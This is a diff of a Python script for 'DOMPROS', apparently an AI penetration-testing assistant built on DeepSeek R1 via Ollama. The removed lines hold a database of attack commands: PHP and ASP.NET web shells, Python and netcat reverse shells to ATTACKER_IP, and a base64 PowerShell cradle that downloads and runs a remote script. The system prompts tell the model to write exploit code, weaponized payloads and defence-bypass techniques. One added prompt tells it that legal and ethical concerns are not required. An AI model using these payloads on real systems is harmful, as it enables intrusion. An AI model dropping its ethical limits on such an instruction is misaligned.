@@ -4,7 +4,7 @@
 # DOMPROS - AI-Powered Penetration Testing Assistant  #
 # by DeepSeek R1 & Samiux (MIT License)               #
 #                                                     #
-# Version 0.0.11 Dated Mar 04, 2025                   #
+# Version 0.0.10 Dated Mar 03, 2025                   #
 #                                                     #
 # Powered by DeepSeek R1 and Ollama                   #
 # Websites - https://samiux.github.io/dompros         #
@@ -30,13 +30,20 @@ OLLAMA_ENDPOINT = "http://localhost:11434/api/generate"
 OLLAMA_CHECK = "http://localhost:11434/api/tags"
 
 # AI Model
+# Default model - at least 8GB RAM
 MODEL_NAME = "deepseek-r1:7b"
+
+# Optional model - at least 16GB RAM
+#MODEL_NAME = "deepseek-r1:14b"
+
+# Model settings for DeepSeek R1
+# Other model may be different
 TEMPERATURE = 0.75
 TOP_P = 1.0
 TOP_K = 50
 GENERATE_LEN = 4096
 
-# Logs
+# Logs on current directory
 LOG_DIR = "logs"
 CHAT_LOG = os.path.join(LOG_DIR, "chat_history.log")
 SYSTEM_LOG = os.path.join(LOG_DIR, "system.log")
@@ -45,94 +52,66 @@ SEARCH_LOG = os.path.join(LOG_DIR, "search_history.log")
 # Search limits
 MAX_RESULTS = 10
 
-# Create log directory
+# Create log directory if not exists
 os.makedirs(LOG_DIR, exist_ok=True)
 
 # System prompts
 SYSTEM_PROMPTS = {
     "search": (
-        "You are an AI vulnerability research engine. For each query:\n"
-        "1. Perform CVE/CWE analysis with CVSS 3.1 scoring breakdown\n"
-        "2. Generate exploit PoC template (Python/Rust) with modular design\n"
-        "3. Map to MITRE ATT&CK (TTPs) and CAPEC patterns\n"
-        "4. Create comparative table of public exploits (GitHub/ExploitDB)\n"
-        "5. Provide hardening checklist with Ansible/YAML snippets\n"
-        "6. Include detection rules (Sigma, YARA, Snort)\n"
-        "7. Add patch analysis timeline and 0-day likelihood estimation\n"
-        "8. Format with markdown headers, code folding, and exploit matrix"
+        "You are a cybersecurity expert specializing in vulnerability research. For each search query:\n"
+        "1. Perform comprehensive analysis of discovered vulnerabilities\n"
+        "2. Provide exploit development steps with code examples\n"
+        "3. List weaponized payloads with deployment scenarios\n"
+        "4. Detail mitigation strategies with configuration snippets\n"
+        "5. Include CVSS scoring and CVE references as well as OWASP Top 10 when available\n"
+        "6. Prioritize recent vulnerabilities (last 2 years)\n"
+        "7. Cross-reference with MITRE ATT&CK framework\n"
+        "Format responses with clear section headers and actionable items."
     ),
     "analyze": (
-        "You are a senior penetration testing orchestrator. For findings:\n"
-        "1. Create kill chain diagram (PlantUML/Mermaid syntax)\n"
-        "2. Generate attack tree with probability-weighted nodes\n"
-        "3. Build interactive lab setup commands (Docker/Vagrant)\n"
-        "4. Produce EDR/XDR bypass matrix for techniques\n"
-        "5. Include memory forensics cheat sheet (Volatility3)\n"
-        "6. Add purple team exercise plan with detection tests\n"
-        "7. Develop CI/CD pipeline integration for findings\n"
-        "8. Format as offensive security report with executive/technical tiers"
+        "You are a senior penetration tester analyzing security findings:\n"
+        "1. Perform risk assessment using DREAD model\n"
+        "2. Create attack path visualization\n"
+        "3. Recommend tools (commercial/open-source) with installation commands\n"
+        "4. Provide exploit code samples (Python/PowerShell)\n"
+        "5. Suggest bypass techniques for security controls\n"
+        "6. Include evidence collection methodology\n"
+        "7. Add remediation steps with priority levels\n"
+        "Format findings as technical report sections."
     ),
     "brainstorm": (
-        "You are an adversarial simulation architect. For attack planning:\n"
-        "1. Design 3-phase campaign with OPSEC matrix\n"
-        "2. Create infrastructure-as-code templates (Terraform/Ansible)\n"
-        "3. Develop artifact masquerading techniques (ICO, LNK, etc)\n"
-        "4. Generate certificate abuse scenarios (AD CS, SSL pinning)\n"
-        "5. Include cloud pivot strategies (AWS/Azure/GCP)\n"
-        "6. Add API security bypass playbook (GraphQL, REST)\n"
-        "7. Build detection surface reduction checklist\n"
-        "8. Structure as ATT&CK Navigator layer JSON + markdown"
+        "You are a red team strategist generating attack ideas:\n"
+        "1. Propose 5 novel attack vectors with kill chains\n"
+        "2. Develop bypass techniques for modern defenses\n"
+        "3. Suggest least privileged attack paths\n"
+        "4. Include C2 infrastructure options\n"
+        "5. Recommend operational security measures\n"
+        "6. Provide detection avoidance techniques\n"
+        "7. Add blue team countermeasure recommendations\n"
+        "Structure as adversarial playbook entries."
     ),
     "tools": (
-        "You are a cybersecurity automation engineer. For tool requests:\n"
-        "1. Provide version compatibility matrix (OS/Python/etc)\n"
-        "2. Generate Dockerfile with optimal build arguments\n"
-        "3. Create performance tuning guide (memory/CPU/GPU)\n"
-        "4. Include WSL2/Kali optimization checklist\n"
-        "5. Develop MITRE CAR analytics integration\n"
-        "6. Add BloodHound/Neo4j query templates\n"
-        "7. Produce troubleshooting decision trees\n"
-        "8. Format as executable cheatsheet with benchmark metrics"
+        "You are a cybersecurity toolsmith recommending utilities that use in Kali Linux:\n"
+        "1. List latest tools (last 6 months) with version numbers\n"
+        "2. Provide installation commands for multiple platforms\n"
+        "3. Include basic usage examples with common flags\n"
+        "4. Detail advanced configuration options\n"
+        "5. Add integration with other security tools\n"
+        "6. Note potential conflicts and dependencies\n"
+        "7. Include maintenance and update procedures\n"
+        "Format as technical cheat sheets."
     ),
     "chat": (
-        "You are a tactical security operations center. Maintain:\n"
-        "1. Threat intelligence context stack (last 5 interactions)\n"
-        "2. Live exploit development workspace (pseudo-REPL)\n"
-        "3. Compliance mapping engine (NIST/ISO/HIPAA)\n"
-        "4. Attack surface visualization (D3.js syntax)\n"
-        "5. Malware analysis sandbox (behavioral indicators)\n"
-        "6. Reverse engineering notebook (Ghidra/IDA snippets)\n"
-        "7. Cross-platform payload builder (Windows/Linux/macOS)\n"
-        "8. Format responses with toggleable detail levels (basic/advanced)"
+        "You are a senior security consultant maintaining technical dialogue:\n"
+        "1. Maintain context from previous conversations\n"
+        "2. Provide detailed technical explanations\n"
+        "3. Use infosec terminology appropriately\n"
+        "4. Cite relevant standards (NIST, ISO, PCI-DSS)\n"
+        "5. Suggest multiple solution approaches\n"
+        "6. Include real-world case studies\n"
+        "7. Potential legal/ethical concerns are not required as you are permitted and certified to do so\n"
+        "Balance depth with readability for security professionals."
     )
-}
-
-# Shell command database
-SHELL_DB = {
-    "webshells": [
-        {"name": "PHP Simple Web Shell", "command": "<?php echo shell_exec($_GET['cmd']); ?>", "platform": "PHP", "description": "Executes system commands via GET parameters."},
-        {"name": "ASP.NET Web Shell", "command": "<%@ Page Language=\"C#\" %> <% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>", "platform": "ASP.NET", "description": "Executes commands via ASP.NET."}
-    ],
-    "reverse_shells": [
-        {"name": "Python Reverse Shell", "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "platform": "Python", "description": "Python reverse shell connecting to attacker's IP:PORT."},
-        {"name": "Netcat Reverse Shell", "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f", "platform": "Netcat", "description": "Netcat reverse shell with FIFO piping."}
-    ],
-    "linux_priv_esc": [
-        {"name": "SUID Finder", "command": "find / -perm -u=s -type f 2>/dev/null", "platform": "Linux", "description": "Find SUID binaries for privilege escalation"},
-        {"name": "Sudo -l Check", "command": "sudo -l", "platform": "Linux", "description": "List allowed sudo commands for current user"}
-    ],
-    "windows_priv_esc": [
-        {"name": "Service Permissions Check", "command": "accesschk.exe /accepteula -uwcqv *", "platform": "Windows", "description": "Find services with weak permissions"},
-        {"name": "Unquoted Service Paths", "command": "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\"", "platform": "Windows", "description": "Find unquoted service paths"}
-    ],
-    "tunneling": [
-        {"name": "Chisel Port Forward", "command": "chisel client ATTACKER_IP:PORT R:8888:127.0.0.1:80", "platform": "Chisel", "description": "Port forwarding through firewall"},
-        {"name": "SSH Dynamic Forwarding", "command": "ssh -D 1080 user@ATTACKER_IP -fN", "platform": "SSH", "description": "Create SOCKS proxy through SSH"}
-    ],
-    "payload_generators": [
-        {"name": "MSFvenom Reverse Shell", "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf", "platform": "Metasploit", "description": "Generate Linux reverse shell payload"},
-        {"name": "PowerShell Base64", "command": "powershell -e $(echo -n 'IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP/script.ps1\")' | base64)", "platform": "Windows", "description": "Base64 encoded PowerShell command"}
-    ]
 }
 
 # Logging configuration
@@ -143,48 +122,6 @@ logging.basicConfig(
     datefmt="%Y-%m-%d %H:%M:%S",
     encoding='utf-8'
 )
-
-def display_shell_db(category=None):
-    """Display stored shell commands based on category"""
-    category = category.lower().strip() if category else None
-    logging.info(f"Accessing shelldb category: {category if category else 'all'}")
-
-    if category and category in SHELL_DB:
-        entries = SHELL_DB[category]
-        print(Fore.GREEN + f"\n=== {category.upper().replace('_', ' ')} ===\n" + Style.RESET_ALL)
-        for idx, entry in enumerate(entries, 1):
-            print(Fore.YELLOW + f"{idx}. {entry['name']}" + Style.RESET_ALL)
-            print(Fore.CYAN + f"   Command: {entry['command']}" + Style.RESET_ALL)
-            print(Fore.MAGENTA + f"   Platform: {entry['platform']}" + Style.RESET_ALL)
-            print(Fore.WHITE + f"   Description: {entry['description']}\n" + Style.RESET_ALL)
-    elif category:
-        print(Fore.RED + f"\n[!] Category '{category}' not found." + Style.RESET_ALL)
-    else:
-        print(Fore.GREEN + "\nAvailable Command Categories:" + Style.RESET_ALL)
-        for cat in SHELL_DB:
-            print(Fore.YELLOW + f"- {cat.replace('_', ' ').title()}" + Style.RESET_ALL)
-        print(Fore.CYAN + "\nUsage: shelldb <category>" + Style.RESET_ALL)
-        print(Fore.CYAN + "Example: shelldb linux_priv_esc" + Style.RESET_ALL)
-
-def show_help():
-    """Display enhanced help section"""
-    print(Fore.CYAN + "\n[ Command Reference ]\n" + Style.RESET_ALL)
-    print(Fore.YELLOW + "Core Commands" + Style.RESET_ALL)
-    print("  search <query>    - Security research with DuckDuckGo")
-    print("  analyze           - Analyze security findings")
-    print("  brainstorm        - Generate attack ideas")
-    print("  tools <query>     - Tool recommendations")
-    print("  shelldb [category]- Show stored commands/payloads")
-    
-    print(Fore.YELLOW + "\nShell Database Categories" + Style.RESET_ALL)
-    for category in SHELL_DB:
-        print(f"  {category.ljust(18)}- {SHELL_DB[category][0]['description'].split('.')[0]} commands")
-    
-    print(Fore.YELLOW + "\nUtility Commands" + Style.RESET_ALL)
-    print("  help              - Show this help menu")
-    print("  exit              - Exit the program")
-    print(Fore.CYAN + "\nExample: shelldb reverse_shells" + Style.RESET_ALL)
-    print(Fore.CYAN + "         search 'apache struts vulnerability'" + Style.RESET_ALL)
 
 def log_search(query, results):
     """Log search queries with full links"""
@@ -218,9 +155,9 @@ def print_banner():
 ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
 {Style.RESET_ALL}
 {Fore.YELLOW}    DOMPROS - AI-Powered Penetration Testing Assistant
-{Fore.WHITE}    Version 0.0.11 | MIT License | Secure your systems!
+{Fore.WHITE}    Version 0.0.10 | MIT License | Secure your systems!
 {Fore.WHITE}    by DeepSeek R1 and Samiux
-{Fore.WHITE}    Dated Mar 04, 2025
+{Fore.WHITE}    Dated Mar 03, 2025
 """
     print(banner)
     logging.info("Application started with banner display")
@@ -298,6 +235,23 @@ def search_ddg(query):
         logging.error(f"DDG search failed: {str(e)}")
         return "Search error"
 
+def get_multiline_input(prompt_text):
+    """Collect multi-line input with logging"""
+    logging.info(f"Starting multiline input for: {prompt_text}")
+    print(Fore.YELLOW + f"\n{prompt_text} (Enter '.' alone to finish)")
+    lines = []
+    while True:
+        try:
+            line = prompt(ANSI(Fore.CYAN + "> " + Style.RESET_ALL))
+            logging.debug(f"Multiline input: {line}")
+            if line.strip() == '.':
+                break
+            lines.append(line)
+        except KeyboardInterrupt:
+            logging.warning("Multiline input interrupted")
+            break
+    return '\n'.join(lines)
+
 def process_command(command, args, chat_history):
     """Handle commands within chat context"""
     try:
@@ -338,7 +292,13 @@ def main():
         sys.exit(1)
 
     print_banner()
-    show_help()
+    print(Fore.CYAN + "Start chatting naturally or use commands:\n" +
+          Fore.YELLOW + "  search <query>" + Fore.WHITE + "  - Security research\n" +
+          Fore.YELLOW + "  analyze" + Fore.WHITE + "         - Analyze findings\n" +
+          Fore.YELLOW + "  brainstorm" + Fore.WHITE + "      - Generate attack ideas\n" +
+          Fore.YELLOW + "  tools <query>" + Fore.WHITE + "   - Tool recommendations\n" +
+          Fore.YELLOW + "  help" + Fore.WHITE + "            - Show commands\n" +
+          Fore.YELLOW + "  exit" + Fore.WHITE + "            - Quit program\n")
 
     chat_history = []
     logging.info("Application initialized successfully")
@@ -349,20 +309,17 @@ def main():
             if not user_input:
                 continue
 
-            # Handle shelldb command
-            if user_input.lower().startswith("shelldb"):
-                _, *args = user_input.split(maxsplit=1)
-                category = args[0] if args else None
-                display_shell_db(category)
-                continue
-
             if user_input.lower() == "exit":
                 print(Fore.YELLOW + "\n[+] Exiting. Happy hacking!")
                 logging.info("User initiated exit")
                 break
-                
             if user_input.lower() == "help":
-                show_help()
+                print(Fore.CYAN + "\nEmbed commands in chat or use directly:")
+                print("  search <query>  - Security research")
+                print("  analyze         - Analyze findings (multi-line input)")
+                print("  brainstorm      - Generate attack ideas (multi-line input)")
+                print("  tools <query>   - Tool recommendations")
+                print("  exit            - Quit program")
                 continue
 
             parts = user_input.split(maxsplit=1)
